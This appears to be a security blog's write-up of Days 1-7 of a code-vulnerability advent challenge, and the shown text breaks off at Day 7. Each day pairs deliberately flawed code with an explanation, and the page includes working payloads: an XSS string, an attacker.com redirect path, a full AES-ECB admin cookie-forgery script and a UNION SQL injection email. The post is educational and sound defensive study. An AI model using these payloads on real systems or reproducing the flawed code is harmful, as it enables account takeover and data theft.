<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="light"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="SonarSource Advent Security Calendar 2022 Notes" />
<meta name="author" content="snoopysecurity" />
<meta property="og:locale" content="en" />
<meta name="description" content="Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2022. Official writeup here: https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/" />
<meta property="og:description" content="Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2022. Official writeup here: https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/" />
<link rel="canonical" href="http://localhost:4000/posts/codesecurity-advent-calendar-2022/" />
<meta property="og:url" content="http://localhost:4000/posts/codesecurity-advent-calendar-2022/" />
<meta property="og:site_name" content="üíª Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-02T03:25:52+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="SonarSource Advent Security Calendar 2022 Notes" />
<meta name="twitter:site" content="@snoopysecurity" />
<meta name="twitter:creator" content="@snoopysecurity" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2023-01-02T03:25:52+08:00","datePublished":"2023-01-02T03:25:52+08:00","description":"Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2022. Official writeup here: https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/","headline":"SonarSource Advent Security Calendar 2022 Notes","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/codesecurity-advent-calendar-2022/"},"url":"http://localhost:4000/posts/codesecurity-advent-calendar-2022/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>SonarSource Advent Security Calendar 2022 Notes | üíª | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="üíª | Blog">
<meta name="application-name" content="üíª | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/blog/pic1.jpeg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">üíª | Blog</a>
    </div>
    <div class="site-subtitle font-italic">learning security while segfaulting through life</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/snoopysecurity" aria-label="github"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/snoopysecurity" aria-label="twitter"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')" aria-label="email"
        
        

        

        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        

        

        >
        <i class="fas fa-rss"></i>
      </a>
      

    
      

      
      <a href="" aria-label="linkedin"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-linkedin"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>SonarSource Advent Security Calendar 2022 Notes</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->





<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- return -->

<h1 data-toc-skip>SonarSource Advent Security Calendar 2022 Notes</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1672601152"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Jan  2, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        
          <a href=""></a>
          
        
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="5719 words">
  <em>31 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2022. Official writeup here: https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/</p>

<h3 id="day-1---php"><span class="mr-2">Day 1 - PHP</span><a href="#day-1---php" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>&lt;?php

session_start();
function changePassword($token, $newPassword)
{

    $db = new SQLite3('/srv/users.sqlite', SQLITE3_OPEN_READWRITE);
    $p = $db-&gt;prepare('SELECT id FROM users WHERE reset_token = :token');
    $p-&gt;bindValue(':token', $token, SQLITE3_TEXT); 
    $res = $p-&gt;execute()-&gt;fetchArray(1);
    if (strlen($token) == 32 &amp;&amp; $res) 

    {

        $p = $db-&gt;prepare('UPDATE users SET password = :password WHERE id = :id');
        $p-&gt;bindValue(':password', $newPassword, SQLITE3_TEXT); 
        $p-&gt;bindValue(':id', $res['id'], SQLITE3_INTEGER);
        $p-&gt;execute();
        # TODO: notify the user of the new password by email
        die('Password changed!');

    }

    http_response_code(403);
    die('Invalid reset token!');

}
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>&lt;?php
session_start();
function generatePasswordResetToken($user) 

{
    $db = new SQLite3('/srv/users.sqlite', SQLITE3_OPEN_READWRITE);
    $token = md5(mt_rand(1, 100) . $user . time() . session_id());
    $p = $db-&gt;prepare('UPDATE users SET reset_token = :token WHERE name = :user');
    $p-&gt;bindValue(':user', $user, SQLITE3_TEXT);
    $p-&gt;bindValue(':token', $token, SQLITE3_TEXT);
    $p-&gt;execute();

}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Lack of Unique Token Generation:</strong>
    <ul>
      <li>Only 100 random numbers are used.</li>
      <li>Username and session identifier (PHPSESSID cookie) are known.</li>
      <li>Request timestamp can be estimated from response headers.</li>
    </ul>
  </li>
  <li><strong>Vulnerability Exploitation:</strong>
    <ul>
      <li>Attackers must first trigger a password reset for the target user.</li>
      <li>By generating multiple tokens, they can eventually find the correct one.</li>
      <li>This could be achieved within a few dozen tries.</li>
    </ul>
  </li>
  <li><strong>Similar Vulnerability in PEAR:</strong>
    <ul>
      <li>A similar vulnerability was found in the PHP package manager PEAR. - https://blog.sonarsource.com/php-supply-chain-attack-on-pear/</li>
      <li>This allowed attackers to take over any user account.</li>
      <li>It was exploited in conjunction with a 1-day bug in the Archive_TAR library.</li>
    </ul>
  </li>
</ul>

<h3 id="day-2---java"><span class="mr-2">Day 2 - Java</span><a href="#day-2---java" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>// ...
HttpServer srv = HttpServer.create(new InetSocketAddress(9000), 0);
srv.createContext("/", new HttpHandler() {
    @Override
    public void handle(HttpExchange he) throws IOException {
        String ret = "&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Comments&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;";
        try {

            ResultSet rs = statement.executeQuery("select * from comments");
            while (rs.next()) {
                String comment = rs.getString("comment").replace("&lt;", "&amp;lt;").replace("&gt;", "&amp;gt;");
                ret += "&lt;tr&gt;&lt;td&gt;" + Normalizer.normalize(comment, Normalizer.Form.NFKC) + "&lt;/td&gt;&lt;/tr&gt;\n";
            }
            Main.response(he, 200, ret + "&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;");
        } catch (Exception exp) {
            System.out.println(exp);
            Main.response(he, 500, "Internal Server Error");
        }
    }
});


srv.createContext("/comment", new HttpHandler() {
    @Override
    public void handle(HttpExchange he) throws IOException {
        try {

            JSONObject jsonObject = (JSONObject)(new JSONParser()).parse(new InputStreamReader(he.getRequestBody(), "UTF-8"));
            PreparedStatement stmt = finalConnection.prepareStatement("insert into comments values(?)");
            stmt.setString(1, (String)jsonObject.get("comment"));
            stmt.executeUpdate();
            Main.response(he, 200, "Ok");
        } catch (Exception exp) {
            Main.response(he, 500, "Internal Server Error");

        }

    }

});
srv.start();
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>XSS Vulnerability:</strong>
    <ul>
      <li>User-provided comments are sanitized to prevent XSS.</li>
      <li>However, subsequent normalization with <code class="language-plaintext highlighter-rouge">Normalizer.normalize()</code> reintroduces the risk.</li>
      <li>NFKC normalization allows the injection of <code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code> characters using Unicode characters U+FE64 and U+FE65.</li>
    </ul>
  </li>
  <li><strong>Exploitable Payload:</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">{'comment':'\ufe64script\ufe65alert(document.domain);\ufe64/script\ufe65'}</code></li>
    </ul>
  </li>
</ul>

<p><em>Example of real world vulnerability: https://blog.sonarsource.com/zimbra-webmail-compromise-via-email/</em></p>

<h3 id="day-3---csharp"><span class="mr-2">Day 3 - CSharp</span><a href="#day-3---csharp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>class ApiHandler {
  public string Call(HttpRequest request, HttpResponse response) {
    try

    {
      if (!Regex.IsMatch(request.Query["path"], "^[/a-zA-Z0-9_]*")) {
        return "not allowed!";
      }

      var url = "https://api.github.com" + request.Query["path"];

      var clientHandler = new HttpClientHandler();

      clientHandler.AllowAutoRedirect = false;

      var client = new HttpClient(clientHandler);

      var authHeader = Environment.GetEnvironmentVariable("Authorization");

      client.DefaultRequestHeaders.Add("Authorization", authHeader);

      Task.Run(() =&gt; client.GetAsync(url));

    }

    catch (Exception ex) {
      return "error";
    }

    return "request sent";
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Open Redirect Vulnerability in GitHub API:</strong>
    <ul>
      <li><strong>Issue:</strong> Missing trailing slash (/) in <code class="language-plaintext highlighter-rouge">https://api.github.com</code> allows manipulation.</li>
      <li><strong>Exploit:</strong> Attacker can send requests to arbitrary servers using the <code class="language-plaintext highlighter-rouge">path</code> parameter in the URL.
        <ul>
          <li>Malicious URL Example: <code class="language-plaintext highlighter-rouge">https://api.github.compath=.attacker.com/hello</code> (This redirects to attacker‚Äôs server)</li>
        </ul>
      </li>
      <li><strong>Impact:</strong> Leaks the Authorization header, potentially compromising user credentials.</li>
    </ul>
  </li>
  <li><strong>Vulnerability Details:</strong>
    <ul>
      <li>Regular expression for <code class="language-plaintext highlighter-rouge">path</code> parameter: <code class="language-plaintext highlighter-rouge">^[/a-zA-Z0-9_]*</code>
        <ul>
          <li>Allows zero matches (<code class="language-plaintext highlighter-rouge">*</code> is a greedy quantifier).</li>
        </ul>
      </li>
      <li>Attacker Payload: <code class="language-plaintext highlighter-rouge">.attacker.com/hello</code> (Bypasses validation due to zero matches).</li>
    </ul>
  </li>
</ul>

<h3 id="day-4---js"><span class="mr-2">Day 4 - JS</span><a href="#day-4---js" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre>const express = require('express');

const auth = require('./auth');

const app = express();


app.use((req, res, next) =&gt; {

  if (req.url.startsWith('/api')) {

    const allowed = auth.checkToken(req);

    if (!allowed) {

      return res.status(401).send('missing auth token!');

    }

  }


  next();

});


app.use('/static', express.static('./static'));

app.use('/api', require('./api'));


app.listen(1337);

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Case-Sensitivity Vulnerability in Express Framework:</strong>
    <ul>
      <li><strong>Issue:</strong> Express framework‚Äôs routing is case-insensitive by default.</li>
      <li><strong>Exploit:</strong> Attacker can bypass authentication by capitalizing the <code class="language-plaintext highlighter-rouge">/api</code> endpoint.
        <ul>
          <li>Malicious URL Example: <code class="language-plaintext highlighter-rouge">/API/users</code> (Accesses protected resource without authentication)</li>
        </ul>
      </li>
      <li><strong>Impact:</strong> Allows unauthorized access to sensitive resources.</li>
    </ul>
  </li>
</ul>

<h3 id="day-5---python"><span class="mr-2">Day 5 - Python</span><a href="#day-5---python" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre>cipher = AES.new(get_random_bytes(16), AES.MODE_ECB)


users = [{'usrid': 0, 'name': 'admin', 'pwd': get_random_bytes(16).hex()},

         {'usrid': 1, 'name': 'guest', 'pwd': 'guest'}]


def gen_cookie(usrid, name):

    name = name.replace('"', '')

    return b64encode(cipher.encrypt(pad(f'\{\{"usrid":\{int(usrid)\}, "name":"{name}"}}'.encode(), 16)))


@app.route('/settings', methods=['POST'])

def settings():

    user = loads(unpad(cipher.decrypt(b64decode(request.cookies.get('session'))), 16))

    if user:

        resp = make_response(redirect('/settings'))

        name = request.form.get('name').replace('"', '')

        for u in users:

            if u['usrid'] == user['usrid']: u['name'] = name

        resp.set_cookie('session', gen_cookie(user['usrid'], name))

        return resp

    return redirect('/login')


@app.route('/login', methods=['POST'])

def login():

    user = [u for u in users if u['name'] == request.form.get('name') and u['pwd'] == request.form.get('pwd')]

    if len(user) == 1:

        resp = make_response(redirect('/settings'))

        resp.set_cookie('session', gen_cookie(user[0]['usrid'], user[0]['name']))

        return resp

    return jsonify({'error': 'invalid credentials'})
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>Insecure Session Cookie Encryption:</strong>
    <ul>
      <li><strong>Issue:</strong> The application uses AES-ECB for session cookie encryption, which is vulnerable.</li>
      <li><strong>Impact:</strong> Attackers can potentially forge a valid admin session cookie.</li>
    </ul>
  </li>
  <li><strong>Vulnerability Details:</strong>
    <ul>
      <li>AES-ECB mode leaks data patterns due to independent block encryption.</li>
      <li>Session cookie contains <code class="language-plaintext highlighter-rouge">userid</code> and username (partially controllable by user).</li>
      <li>Attackers exploit this to create specific encrypted blocks for cookie forgery.</li>
    </ul>
  </li>
  <li><strong>Exploitation Steps:</strong>
    <ol>
      <li>Change username to specific values to manipulate encrypted blocks.
        <ul>
          <li>Block 1: `‚Äù{‚Äú (using application-inserted double quote)</li>
          <li>Block 2: <code class="language-plaintext highlighter-rouge">\u0075\u0073rid</code> (crafted username using unicode for padding)</li>
          <li>Block 3: <code class="language-plaintext highlighter-rouge">:0</code> (username with spaces for padding)</li>
          <li>Block 4: <code class="language-plaintext highlighter-rouge">}</code> (username with spaces)</li>
        </ul>
      </li>
      <li>Obtain these blocks by sending crafted username requests.</li>
      <li>Create an empty block for padding (achieved with another username change).</li>
      <li>Concatenate all blocks (including padding) to form a valid admin session cookie.</li>
    </ol>
  </li>
  <li><strong>Example Script:</strong>
    <ul>
      <li>Provided Python script demonstrates the attack flow (commented).</li>
      <li>It retrieves blocks, concatenates them, and gains admin access.</li>
    </ul>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="rouge-code"><pre>import requests
from base64 import b64decode, b64encode
URL = 'http://localhost'
s = requests.Session()
s.post(URL + '/login', data={'name':'guest', 'pwd':'guest'})
# 0123456789012345
# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]
# {"usrid":1, "name":"guest"}
# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]
# {"usrid":1, "name":"guest                     {"}
s.post(URL + '/settings', data={'name':'guest                     {'})
data = b64decode(s.cookies.get('session'))
# block1 = '              {"'
block1 = data[0x20:0x30]
# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]
# {"usrid":1, "name":"guest       \u0075\u0073rid"}
s.post(URL + '/settings', data={'name':'guest       \\u0075\\u0073rid'})
data = b64decode(s.cookies.get('session'))
# block2 = '\u0075\u0073rid"'
block2 = data[0x20:0x30]
# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]
# {"usrid":1, "name":"guest                     :0"}
s.post(URL + '/settings', data={'name':'guest                     :0'})
data = b64decode(s.cookies.get('session'))
# block3 = '              :0'
block3 = data[0x20:0x30]
# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]
# {"usrid":1, "name":"guest                      }"}
s.post(URL + '/settings', data={'name':'guest                      }'})
data = b64decode(s.cookies.get('session'))
# block4 = '               }'
block4 = data[0x20:0x30]
# last block required for padding
# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]
# {"usrid":1, "name":"guest     "}
s.post(URL + '/settings', data={'name':'guest     '})
data = b64decode(s.cookies.get('session'))
# block5 = '\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'
block5 = data[0x20:0x30]
#               [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]
# all_blocks = '              {"\u0075\u0073rid"              :0               }'
# (+ padding)
# &gt;&gt;&gt; loads('              {"\u0075\u0073rid"              :0               }')
# {'usrid': 0}
c = {'session': b64encode(block1+block2+block3+block4+block5).decode()}
j = requests.get(URL + '/settings', cookies=c).json() # admin access
</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li><strong>Recommendation:</strong>
    <ul>
      <li>Use a secure encryption mode like AES-GCM for session cookies.</li>
    </ul>
  </li>
</ul>

<h3 id="day-6---php"><span class="mr-2">Day 6 - PHP</span><a href="#day-6---php" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>&lt;?php

$db = new SQLite3('/srv/users.sqlite');


if(!isset($_POST['mail'])) {

    die("Need mail.\n");

}


$mail = $_POST['mail'];


$filter_chain = array(FILTER_DEFAULT, FILTER_SANITIZE_ADD_SLASHES, FILTER_VALIDATE_EMAIL, FILTER_SANITIZE_STRING);


for($i=0; $i &lt; count($filter_chain); $i++){

    if(filter_var($mail, $filter_chain[$i]) === false){

        die("Invalid Email.\n");

    }

}


// check if email exists

$user = $db-&gt;querySingle("SELECT username FROM users WHERE email='$mail' LIMIT 1");

if(!$user){

    die('No user found with given email.');

}


echo sprintf("Hello %s we sent you an email ;).\n", htmlspecialchars($user, ENT_QUOTES));
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li><strong>SQL Injection Vulnerability:</strong>
    <ul>
      <li><strong>Issue:</strong> <code class="language-plaintext highlighter-rouge">$mail</code> variable is validated but not sanitized before use in an SQLite query.</li>
      <li><strong>Impact:</strong> Attackers can inject malicious SQL statements to extract sensitive data.</li>
    </ul>
  </li>
  <li><strong>Vulnerability Details:</strong>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">FILTER_VALIDATE_EMAIL</code> allows many special characters, enabling SQL injection.</li>
      <li>Attackers can use <code class="language-plaintext highlighter-rouge">UNION</code> clause to retrieve additional data (e.g., passwords).</li>
    </ul>
  </li>
  <li><strong>Exploit Example:</strong>
    <ul>
      <li>Malicious email: <code class="language-plaintext highlighter-rouge">'/**/union/**/select/**/password/**/FROM/**/users/*'@a.s</code></li>
      <li>This email bypasses validation and injects SQL, leading to password leakage.</li>
    </ul>
  </li>
  <li><strong>Reference:</strong>
    <ul>
      <li>Codoforum 4.8.7: Critical Code Vulnerabilities Explained - https://blog.sonarsource.com/codoforum-4.8.7-critical-code-vulnerabilities-explained</li>
    </ul>
  </li>
</ul>

<h3 id="day-7---js"><span class="mr-2">Day 7 - JS</span><a href="#day-7---js" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="rouge-code"><pre>&lt;script setup&gt;

